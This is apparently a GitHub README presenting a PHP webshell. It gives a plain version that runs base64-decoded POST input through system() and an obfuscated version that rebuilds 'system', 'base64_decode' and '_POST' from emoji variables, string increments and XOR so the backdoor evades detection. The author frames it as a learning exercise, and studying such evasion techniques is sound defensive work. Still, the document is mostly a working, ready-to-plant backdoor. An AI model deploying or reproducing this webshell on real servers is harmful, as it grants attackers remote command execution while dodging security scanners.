# php-emoji-webshell

🥸 Nothing new about this webshell, just use same techniques like XOR and self increment operations.

Basically this code
```php
<?php

$a = $_POST[4] ? base64_decode($_POST[4]) : 'whoami';
@system($a);

```
Turn into emoji, self increment and XOR operations.

```php
<?php

$_=[];
$_=@"$_";
$__=("_"=="_")+("_"=="_");
$_=@$_[++$__];

$🌏=$_++; // a
$🤮=$_++; // b
$🍪=$_++; // c
$🫣=$_++; // d
$🧁=$_++; // e
$🎂=$_++; // f
$🥃=$_++; // g
$🍔=$_++; // h
$🌘=$_++; // i
$🌗=$_++; // j
$🌖=$_++; // k
$🌕=$_++; // l
$🌒=$_++; // m
$🌓=$_++; // n
$🌔=$_++; // o
$🌰=$_++; // p
$🍘=$_++; // q
$🥗=$_++; // r
$🥥=$_++; // s
$🍑=$_++; // t
$🍋=$_++; // u
$🧇=$_++; // v
$🌮=$_++; // w
$🍕=$_++; // x
$🥯=$_++; // y
$🍣=$_;   // z

$__++;
$__++;
$__++;
$👿=$🤮.$🌏.$🥥.$🧁.$__;
$__--;
$__--;
$👿.=$__.("#"^"|").$🫣.$🧁.$🍪.$🌔.$🫣.$🧁;

$💀=$🥥.$🥯.$🥥.$🍑.$🧁.$🌒;
$🥳=("#"^"|").($🥥^"#").($🌕^"#").($🌰^"#").($🌮^"#"); 
$🤯=@${$🥳}[$__] ? $👿(@${$🥳}[$__]) : $🌮.$🍔.$🌔.$🌏.$🌒.$🌘;
@$💀($🤯);

```

Im just building this for fun and for the sake of learning new things. ☕️🥯
